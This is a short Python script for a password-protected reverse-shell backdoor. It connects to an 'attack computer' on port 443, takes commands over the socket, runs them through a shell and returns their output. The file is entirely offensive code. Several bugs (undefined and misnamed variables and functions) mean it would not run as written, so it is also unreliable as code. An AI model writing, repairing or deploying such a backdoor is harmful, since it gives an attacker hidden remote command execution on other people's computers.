import subprocess #Process commands
import socket
login_str = 'login: '
host = '192.168.0.1' #ip of attack computer change if not your network
port = 443 #attack port
pswd = "password" #Password to protect backdoor

def Login():
    global sk
    sk.sendto(login_str)
    pswd = sk.recv(1024) #1024 = buffer size

    if pwd.strip() != pswd: #strips whitespaces
        login() #if user password wrong restart process
    else:
        sk.send("Connected #> ")
        Shell()

def Shell():
    while True:
        data = sk.recv(1024)

        if data.strip() == ":kill":
            break #end program

        #create subprocess std input, output, and errors
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        #hold output
        output = proc.stdout.read()+proc.stderr.read()
        sk.send(output)#send to socket(user)
        s.sendto("#> ")#place in prompt again

#begin script:
sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sk.connect((host,port))#connect socket to remote host
Login()
